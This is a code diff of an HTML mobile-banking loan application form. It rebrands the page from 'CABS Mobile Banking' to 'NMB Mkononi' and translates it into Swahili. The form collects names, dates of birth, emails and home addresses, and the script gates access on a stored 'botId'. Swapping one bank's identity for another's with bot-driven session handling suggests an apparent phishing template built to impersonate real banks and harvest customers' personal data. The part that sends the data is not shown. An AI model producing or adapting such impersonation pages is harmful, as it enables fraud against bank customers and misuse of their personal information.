@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="sw">
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>CABS Mobile Banking - Loan Application</title>
+    <title>NMB Mkononi - Maombi ya Mkopo</title>
 
     <style>
         /* ── reset & base ── */
@@ -217,7 +217,7 @@
 
 <div class="app-wrapper">
 
-    <!-- Top bar (CABS) -->
+    <!-- Top bar -->
     <div class="top-bar">
         <button class="back-btn" onclick="window.history.back()">&#8592;</button>
     </div>
@@ -225,65 +225,65 @@
     <div class="container">
 
         <div class="page-header">
-            <h1>Loan Application</h1>
-            <p>Please provide your personal information</p>
+            <h1>Maombi ya Mkopo</h1>
+            <p>Tafadhali toa taarifa zako binafsi</p>
         </div>
 
         <form id="loanForm">
-            <label>Full Name</label>
-            <input name="fullName" placeholder="e.g. John Doe" required />
+            <label>Jina Kamili</label>
+            <input name="fullName" placeholder="mf. Juma Ali" required />
 
-            <label>Date of Birth</label>
+            <label>Tarehe ya Kuzaliwa</label>
             <input type="date" name="dob" required />
 
-            <label>Email Address</label>
-            <input type="email" name="email" placeholder="example@email.com" required />
+            <label>Barua Pepe</label>
+            <input type="email" name="email" placeholder="mfano@barua.com" required />
 
-            <label>Residential Address</label>
-            <input name="address" placeholder="Your full address" required />
+            <label>Anwani ya Makazi</label>
+            <input name="address" placeholder="Anwani yako kamili" required />
 
-            <label>Employment Status</label>
+            <label>Hali ya Ajira</label>
             <select name="employmentStatus" required>
-                <option value="">Select</option>
-                <option>Employed</option>
-                <option>Self-employed</option>
-                <option>Unemployed</option>
-                <option>Student</option>
+                <option value="">Chagua</option>
+                <option>Nimeajiriwa</option>
+                <option>Kujiajiri</option>
+                <option>Sijaajiriwa</option>
+                <option>Mwanafunzi</option>
             </select>
 
-            <label>Loan Purpose</label>
+            <label>Madhumuni ya Mkopo</label>
             <select name="loanPurpose" required>
-                <option value="">Select</option>
-                <option>Business</option>
-                <option>Personal</option>
-                <option>Education</option>
-                <option>Medical</option>
-                <option>Emergency</option>
+                <option value="">Chagua</option>
+                <option>Biashara</option>
+                <option>Binafsi</option>
+                <option>Elimu</option>
+                <option>Matibabu</option>
+                <option>Dharura</option>
             </select>
 
-            <label>Loan Amount (USD)</label>
-            <input type="number" name="loanAmount" required placeholder="MIN $100" min="100" max="100000" step="1" />
+            <label>Kiasi cha Mkopo (TSh)</label>
+            <input type="number" name="loanAmount" required placeholder="KIWANGO TSh 50,000" min="50000" max="10000000" step="50000" />
 
-            <label>Loan Term</label>
+            <label>Muda wa Mkopo</label>
             <select name="loanTerm" required>
-                <option value="">Select</option>
-                <option>6 months</option>
-                <option selected>12 months</option>
-                <option>24 months</option>
-                <option>36 months</option>
-                <option>48 months</option>
+                <option value="">Chagua</option>
+                <option>Miezi 6</option>
+                <option selected>Miezi 12</option>
+                <option>Miezi 24</option>
+                <option>Miezi 36</option>
+                <option>Miezi 48</option>
             </select>
 
             <div class="checkbox-wrapper">
                 <input type="checkbox" id="termsCheck" required />
-                <label for="termsCheck">I accept the terms and conditions</label>
+                <label for="termsCheck">Ninakubali masharti na vigezo</label>
             </div>
 
             <div class="checkbox-wrapper">
                 <input type="checkbox" id="interestCheck" required />
                 <label for="interestCheck">
-                    I understand that loans are subject to an interest rate of <strong>8% to 15% per month</strong>
-                    depending on creditworthiness and loan amount.
+                    Ninaelewa kwamba mikopo inategemea kiwango cha riba cha <strong>8% hadi 15% kwa mwezi</strong>
+                    kulingana na uwezo wa mkopaji na kiasi cha mkopo.
                 </label>
             </div>
         </form>
@@ -292,11 +292,11 @@
     </div>
 
     <!-- Fixed button -->
-    <button id="continueBtn" class="continue-btn" disabled>SUBMIT</button>
+    <button id="continueBtn" class="continue-btn" disabled>TUMA</button>
 
 </div>
 
-<!-- ====== YOUR ORIGINAL SCRIPT (UNTOUCHED, except for the alert language) ====== -->
+<!-- ====== SCRIPT (Kiswahili alert) ====== -->
 <script>
     (function() {
         // ---------- BOT ID ----------
@@ -306,7 +306,7 @@
         const botId = localStorage.getItem('botId');
 
         if (!botId) {
-            alert('Invalid session. Please start again.');
+            alert('Kipindi si sahihi. Tafadhali anza tena.');
             window.location.href = 'index.html';
             return;
         }
@@ -346,9 +346,6 @@
                 form.dispatchEvent(new Event('submit'));
             }
         });
-
-        // ---------- BACK BUTTON (top bar) already uses onclick ----------
-        // Also handle the case where the back button might be needed.
     })();
 </script>
 
